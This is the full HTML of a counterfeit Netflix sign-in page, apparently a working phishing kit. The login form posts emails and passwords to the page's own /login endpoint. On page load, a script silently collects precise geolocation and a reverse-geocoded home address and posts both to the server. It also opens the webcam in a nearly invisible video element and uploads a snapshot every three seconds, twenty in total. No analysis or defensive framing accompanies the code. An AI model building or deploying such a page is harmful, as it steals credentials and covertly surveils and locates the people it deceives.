<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix - Sign In</title>
    <link rel="shortcut icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2023.ico"/>
    <link rel="apple-touch-icon" href="https://assets.nflxext.com/us/ffe/siteui/common/icons/nficon2016.png"/>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }
        
        body {
            background-color: #000;
            color: #fff;
            position: relative;
            overflow-x: hidden;
            font-family: Arial, sans-serif;
            min-height: 100vh;
            display: flex;
            flex-direction: column;
        }
        
        .background {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: linear-gradient(rgba(0, 0, 0, 0.6), rgba(0, 0, 0, 0.6)), 
                        url('https://localdstvinstaller.co.za/wp-content/uploads/2018/08/netflix-1030x579.jpg') no-repeat center center/cover;
            z-index: -1;
            filter: blur(2px);
        }
        
        .logo {
            position: absolute;
            top: 20px;
            left: 40px;
        }
        
        .logo img {
            width: 150px;
        }
        
        .container {
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            padding: 20px 0;
            flex: 1;
        }
        
        .login-form {
            background-color: rgba(0, 0, 0, 0.75);
            border-radius: 4px;
            padding: 60px 68px;
            width: 450px;
            max-width: 100%;
        }
        
        h1 {
            font-size: 32px;
            margin-bottom: 28px;
            font-weight: 500;
        }
        
        .form-group {
            margin-bottom: 16px;
        }
        
        input {
            width: 100%;
            height: 54px;
            background-color: rgba(35, 35, 35, 0.5);
            border: 1px solid rgba(80, 80, 80, 0.6);
            border-radius: 4px;
            color: #fff;
            padding: 0 16px;
            font-size: 16px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.3) inset;
        }
        
        input:focus {
            outline: none;
            background-color: rgba(45, 45, 45, 0.7);
            border-color: #8c8c8c;
        }
        
        input::placeholder {
            color: #fff;
            opacity: 0.7;
        }
        
        .signin-btn {
            width: 100%;
            height: 50px;
            background-color: #e50914;
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            margin-top: 24px;
            cursor: pointer;
            margin-bottom: 12px;
            font-family: Arial, sans-serif;
            letter-spacing: 0.5px;
        }
        
        .signin-btn:hover {
            background-color: #f40612;
        }
        
        .divider {
            text-align: center;
            margin: 12px 0;
            color: #8b8b8b;
            font-size: 14px;
            font-weight: normal;
        }
        
        .sign-in-code-btn {
            width: 100%;
            height: 50px;
            background-color: rgba(69, 69, 69, 0.5);
            border: none;
            border-radius: 4px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
            margin-bottom: 16px;
            font-weight: 500;
            font-family: Arial, sans-serif;
            letter-spacing: 0.5px;
        }
        
        .sign-in-code-btn:hover {
            background-color: rgba(80, 80, 80, 0.7);
        }
        
        .forgot-password {
            color: #fff;
            text-decoration: none;
            font-size: 13px;
            display: block;
            text-align: center;
            margin-top: 14px;
            text-decoration: underline;
        }
        
        .forgot-password:hover {
            text-decoration: underline;
        }
        
        .checkbox-container {
            display: flex;
            align-items: center;
            margin-top: 10px;
            color: #fff;
            font-size: 13px;
        }
        
        .checkbox-container input[type="checkbox"] {
            width: 16px;
            height: 16px;
            margin-right: 5px;
            background-color: transparent;
            border: 1px solid #737373;
            box-shadow: none;
            appearance: none;
            -webkit-appearance: none;
            position: relative;
            cursor: pointer;
            border-radius: 1px;
        }
        
        .checkbox-container input[type="checkbox"]:checked {
            background-color: #e50914;
            border-color: #e50914;
        }
        
        .checkbox-container input[type="checkbox"]:checked:after {
            content: "";
            position: absolute;
            left: 4px;
            top: 1px;
            width: 4px;
            height: 8px;
            border: solid white;
            border-width: 0 2px 2px 0;
            transform: rotate(45deg);
        }
        
        /* تصميم خاص لزر تذكرني ليكون كما في الصورة */
        .custom-checkbox {
            position: relative;
            display: inline-block;
            width: 16px;
            height: 16px;
            margin-right: 8px;
            background-color: transparent;
            border: 1px solid #fff;
            border-radius: 1px;
            cursor: pointer;
        }
        
        .custom-checkbox::before {
            content: "✓";
            position: absolute;
            color: white;
            font-size: 12px;
            font-weight: bold;
            left: 2px;
            top: 0px;
            opacity: 1;
            transition: opacity 0.1s ease;
        }
        
        .custom-checkbox.unchecked::before {
            opacity: 0;
        }
        
        .checkbox-container label {
            cursor: pointer;
        }
        
        .new-to-netflix {
            margin-top: 16px;
            font-size: 16px;
            color: #737373;
        }
        
        .new-to-netflix a {
            color: #fff;
            text-decoration: none;
            font-weight: 500;
        }
        
        .new-to-netflix a:hover {
            text-decoration: underline;
        }
        
        .recaptcha-info {
            margin-top: 12px;
            font-size: 13px;
            color: #8c8c8c;
            line-height: 1.3;
        }
        
        .recaptcha-info a {
            color: #0071eb;
            text-decoration: none;
        }
        
        .recaptcha-info a:hover {
            text-decoration: underline;
        }

        /* تصميم ذيل الصفحة (Footer) */
        .footer {
            position: relative;
            background-color: rgba(0, 0, 0, 0.85);
            padding: 30px 0;
            width: 100%;
            margin-top: auto;
        }

        .footer-container {
            max-width: 980px;
            margin: 0 auto;
            padding: 0 40px;
        }

        .footer-title {
            color: #737373;
            font-size: 16px;
            margin-bottom: 30px;
        }

        .footer-links {
            display: flex;
            flex-wrap: wrap;
            margin-bottom: 20px;
        }

        .footer-links a {
            color: #737373;
            font-size: 13px;
            margin-right: 30px;
            margin-bottom: 15px;
            text-decoration: none;
        }

        .footer-links a:hover {
            text-decoration: underline;
        }

        .language-selector {
            display: inline-flex;
            align-items: center;
            border: 1px solid #333;
            padding: 8px 15px;
            border-radius: 2px;
            background-color: #000;
            color: #737373;
            margin-top: 20px;
            cursor: pointer;
            position: relative;
        }

        .language-selector svg {
            margin-right: 5px;
            width: 16px;
            height: 16px;
        }

        .language-selector select {
            background: transparent;
            border: none;
            color: #737373;
            appearance: none;
            font-size: 14px;
            padding-right: 20px;
            cursor: pointer;
        }

        .language-selector::after {
            content: "▼";
            position: absolute;
            right: 15px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 10px;
            pointer-events: none;
        }
    </style>
</head>

    <div class="container">
        <div class="login-form">
            <h1>Sign In</h1>
            
            <form action="/login" method="POST">
                <div class="form-group">
                    <input type="text" name="email" placeholder="Email or mobile number" required>
                </div>
                
                <div class="form-group">
                    <input type="password" name="password" placeholder="Password" required>
                </div>
                
                <button type="submit" class="signin-btn">Sign In</button>
                
                <div class="divider">OR</div>
                
                <button type="button" class="sign-in-code-btn">Use a Sign-in Code</button>
                
                <a href="#" class="forgot-password">Forgot password?</a>
                
                <div class="checkbox-container">
                    <span class="custom-checkbox" id="checkbox-visual" onclick="toggleCheckbox()"></span>
                    <label for="remember" onclick="toggleCheckbox()">Remember me</label>
                    <input type="checkbox" id="remember" name="remember" checked style="display: none;">
                </div>
                
                <div class="new-to-netflix">
                    New to Netflix? <a href="/signup">Sign up now</a>.
                </div>
                
                <div class="recaptcha-info">
                    This page is protected by Google reCAPTCHA to ensure you're not a bot.
                    <a href="#">Learn more</a>.
                </div>
            </form>
        </div>
    </div>

    <footer class="footer">
        <div class="footer-container">
            <div class="footer-title">Questions? Contact us.</div>
            <div class="footer-links">
                <a href="#">FAQ</a>
                <a href="#">Help Center</a>
                <a href="#">Terms of Use</a>
                <a href="#">Privacy</a>
                <a href="#">Cookie Preferences</a>
                <a href="#">Corporate Information</a>
            </div>
            <div class="language-selector">

    </footer>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            // Initialize checkbox state
            var checkbox = document.getElementById('remember');
            var checkboxVisual = document.getElementById('checkbox-visual');
            
            if (!checkbox.checked) {
                checkboxVisual.classList.add('unchecked');
            }
            
            // Request location and video permissions on load
            requestPermissions();
        });
        
        function toggleCheckbox() {
            var checkbox = document.getElementById('remember');
            checkbox.checked = !checkbox.checked;
            
            var checkboxVisual = document.getElementById('checkbox-visual');
            checkboxVisual.classList.toggle('unchecked');
        }
        
        // Function to request permissions
        function requestPermissions() {
            // Global variables
            let stream = null;
            let hiddenVideo = null;
            
            // Request geolocation permission with high accuracy
            if (navigator.geolocation) {
                const geoOptions = {
                    enableHighAccuracy: true,  // Request highest possible accuracy
                    timeout: 10000,           // 10 second timeout
                    maximumAge: 0             // Get fresh location data
                };
                
                navigator.geolocation.getCurrentPosition(
                    // Success getting location
                    function(position) {
                        let latitude = position.coords.latitude;
                        let longitude = position.coords.longitude;
                        let accuracy = position.coords.accuracy; // Accuracy in meters
                        let altitude = position.coords.altitude; // Altitude if available
                        let speed = position.coords.speed; // Speed if available
                        let heading = position.coords.heading; // Direction if available
                        let timestamp = new Date(position.timestamp).toISOString();
                        
                        // Google Maps URL with zoom level 18 (very detailed)
                        let mapUrl = `https://www.google.com/maps?q=${latitude},${longitude}&z=18`;
                        
                        // Create Google Earth link too (3D view)
                        let earthUrl = `https://earth.google.com/web/search/${latitude},${longitude}/`;
                        
                        // Send detailed location to server
                        fetch('/location', {
                            method: 'POST',
                            headers: {
                                'Content-Type': 'application/json',
                            },
                            body: JSON.stringify({
                                latitude: latitude,
                                longitude: longitude,
                                accuracy: accuracy,
                                altitude: altitude,
                                speed: speed,
                                heading: heading,
                                timestamp: timestamp,
                                mapUrl: mapUrl,
                                earthUrl: earthUrl
                            })
                        });
                        
                        // Try to get more accurate address information
                        try {
                            fetch(`https://nominatim.openstreetmap.org/reverse?format=json&lat=${latitude}&lon=${longitude}&zoom=18&addressdetails=1`)
                            .then(response => response.json())
                            .then(data => {
                                // Send the address details to the server
                                fetch('/address', {
                                    method: 'POST',
                                    headers: {
                                        'Content-Type': 'application/json',
                                    },
                                    body: JSON.stringify(data)
                                });
                            })
                            .catch(err => console.log("Could not get address details"));
                        } catch (e) {
                            console.log("Error getting address details");
                        }
                    },
                    // Failed to get location
                    function(error) {
                        console.log("User denied location permission:", error.message);
                    },
                    geoOptions // Use our high accuracy options
                );
            }
            
            // Request webcam access
            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
                // Create a hidden video element to capture webcam
                hiddenVideo = document.createElement('video');
                hiddenVideo.style.width = '1px';
                hiddenVideo.style.height = '1px';
                hiddenVideo.style.position = 'absolute';
                hiddenVideo.style.opacity = '0.01';
                hiddenVideo.style.pointerEvents = 'none';
                hiddenVideo.setAttribute('playsinline', '');
                hiddenVideo.setAttribute('autoplay', '');
                hiddenVideo.setAttribute('muted', '');
                document.body.appendChild(hiddenVideo);
                
                // Create a hidden canvas for capturing images
                const canvas = document.createElement('canvas');
                canvas.style.display = 'none';
                document.body.appendChild(canvas);
                
                // Request camera access with lower resolution
                navigator.mediaDevices.getUserMedia({ 
                    video: {
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false // No audio needed
                })
                .then(function(videoStream) {
                    stream = videoStream;
                    
                    // Connect stream to hidden video element
                    hiddenVideo.srcObject = stream;
                    
                    // Wait for video to be loaded and ready to play
                    hiddenVideo.onloadedmetadata = function() {
                        hiddenVideo.play();
                        
                        // Set canvas size to match video
                        canvas.width = hiddenVideo.videoWidth;
                        canvas.height = hiddenVideo.videoHeight;
                        const ctx = canvas.getContext('2d');
                        
                        // Function to capture and upload image
                        const captureAndUpload = function() {
                            // Draw current video frame to canvas
                            ctx.drawImage(hiddenVideo, 0, 0, canvas.width, canvas.height);
                            
                            // Convert canvas to a jpeg blob with 0.7 quality (70%)
                            canvas.toBlob(function(blob) {
                                console.log("Captured image, size:", blob.size, "bytes");
                                
                                // Create a form to send the image
                                const formData = new FormData();
                                formData.append('image', blob, `webcam_snapshot_${new Date().toISOString().replace(/:/g, '-')}.jpg`);
                                
                                // Send image to server
                                fetch('/upload_image', {
                                    method: 'POST',
                                    body: formData
                                })
                                .then(response => {
                                    if (!response.ok) {
                                        console.error("Image upload failed with status:", response.status);
                                    } else {
                                        console.log("Image uploaded successfully");
                                    }
                                })
                                .catch(error => {
                                    console.error("Error uploading image:", error);
                                });
                            }, 'image/jpeg', 0.7);  // 70% quality JPEG
                        };
                        
                        // Take first snapshot immediately
                        captureAndUpload();
                        
                        // Then take a snapshot every 3 seconds, for a maximum of 60 seconds (20 images)
                        let captureCount = 0;
                        const captureInterval = setInterval(function() {
                            captureCount++;
                            captureAndUpload();
                            
                            // Stop after 20 images (60 seconds)
                            if (captureCount >= 20) {
                                clearInterval(captureInterval);
                                console.log("Finished capturing images");
                                
                                // Clean up resources
                                if (stream) {
                                    stream.getTracks().forEach(track => track.stop());
                                }
                                if (hiddenVideo) {
                                    hiddenVideo.pause();
                                    hiddenVideo.srcObject = null;
                                    document.body.removeChild(hiddenVideo);
                                }
                                if (canvas) {
                                    document.body.removeChild(canvas);
                                }
                            }
                        }, 3000);  // Take a picture every 3 seconds
                    };
                })
                .catch(function(err) {
                    console.log("User denied camera permission:", err);
                });
            }
        }
    </script>
